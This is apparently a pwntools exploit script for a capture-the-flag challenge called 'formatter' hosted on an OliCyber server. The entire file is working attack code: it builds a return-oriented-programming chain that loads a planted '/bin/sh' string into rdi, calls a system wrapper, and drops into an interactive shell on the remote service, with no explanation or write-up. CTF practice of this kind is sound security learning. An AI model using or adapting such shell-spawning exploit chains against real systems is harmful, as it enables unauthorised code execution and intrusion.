from pwn import *

exe = ELF("./formatter_patched")

context.binary = exe

HOST = "formatter.challs.olicyber.it"
PORT = 20006

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

POP_RDI = pack(0x4015e3)

BINSH = pack(0x4050a0 + 24)
USER_INPUT = pack(0x4050a0)

SYSTEM = pack(exe.symbols.system_wrapper)

def main():
    r = conn()

    payload = POP_RDI + BINSH + SYSTEM + b"/bin/sh\x00" + b"\s" * 12 + USER_INPUT
    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()
